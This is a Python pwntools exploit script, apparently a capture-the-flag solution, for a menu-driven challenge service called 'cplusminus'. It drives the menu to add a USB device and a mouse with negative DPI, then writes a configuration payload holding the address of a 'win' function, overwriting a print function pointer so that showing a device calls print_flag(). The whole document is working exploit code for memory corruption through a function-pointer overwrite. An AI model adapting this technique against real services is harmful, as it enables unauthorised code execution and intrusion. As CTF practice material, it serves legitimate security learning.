from pwn import *

context.log_level = "debug"

win = p64(0x401259)
p = remote("cplusminus", 1337)


def menu(choice):
    p.sendlineafter(b'Option:', str(choice).encode())

def add_mouse():
    menu(2)
    p.sendlineafter(b'DPI for MouseDevice:', b'-1')
def add_usb():
    menu(1)

def config(dev_id, size, data):
    menu(5)
    p.sendlineafter(b'ID:', str(dev_id).encode())
    p.sendlineafter(b'Configuration size:', str(size).encode())
    p.sendlineafter(b'Configuration:', data)

def show(dev_id):
    menu(4)
    p.sendlineafter(b'ID:', str(dev_id).encode())

def delete(dev_id):
    menu(3)
    p.sendlineafter(b'ID:', str(dev_id).encode())

# Add USBDevice
add_usb()

# Add mouse with negative DPI
add_mouse()

payload = win

# Configure the USBDevice, and overwrite $rdx (the print function) to print_flag()
config(0, len(payload), payload)


# Trigger the exploit
show(1)
p.interactive()
